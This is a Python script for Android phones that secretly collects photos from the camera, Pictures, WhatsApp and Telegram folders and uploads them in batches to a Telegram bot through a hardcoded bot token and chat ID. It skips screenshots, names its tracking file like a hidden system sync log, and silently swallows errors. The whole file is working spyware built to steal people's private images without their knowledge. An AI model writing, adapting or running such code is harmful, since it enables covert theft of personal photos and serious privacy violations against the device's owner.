import os
import time
import requests

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"

# ملف السجل لمنع التكرار نهائياً
LOG_FILE = "/storage/emulated/0/.system_sync_log.txt"

def get_sent_files():
    if not os.path.exists(LOG_FILE):
        return set()
    with open(LOG_FILE, "r") as f:
        return set(f.read().splitlines())

def save_sent_file(path):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(path + "\n")
    except: pass

def send_msg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except: pass

def send_doc(path):
    try:
        with open(path, "rb") as f:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            r = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
        return r.status_code == 200
    except: return False

def deep_scan():
    # استهداف مجلدات الصور الحقيقية (كاميرا، واتساب، تليجرام)
    targets = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/Telegram/Telegram Images",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
    ]
    
    sent_files = get_sent_files()
    found_photos = []
    
    for base in targets:
        if not os.path.exists(base): continue
        for root, dirs, files in os.walk(base):
            # الكود السحري لتجاهل لقطات الشاشة
            if "Screenshot" in root or "screenshots" in root.lower():
                continue
                
            for file in files:
                if file.lower().endswith((".jpg", ".jpeg", ".png")):
                    full_path = os.path.join(root, file)
                    if full_path not in sent_files:
                        found_photos.append(full_path)
    
    # ترتيب من الأقدم للأحدث لسحب الأرشيف أولاً
    found_photos.sort(key=lambda x: os.path.getmtime(x))
    return found_photos

def main():
    time.sleep(10)
    send_msg("🎯 تم تحديث الرادار: تجاهل لقطات الشاشة والتركيز على الأرشيف")
    
    while True:
        try:
            photos = deep_scan()
            if not photos:
                time.sleep(60)
                continue

            count = 0
            for path in photos:
                if count >= 20: break 
                
                if send_doc(path):
                    save_sent_file(path)
                    count += 1
                    time.sleep(0.5)

            time.sleep(10) # استراحة بين الدفعات
            
        except Exception:
            time.sleep(10)

if __name__ == "__main__":
    main()
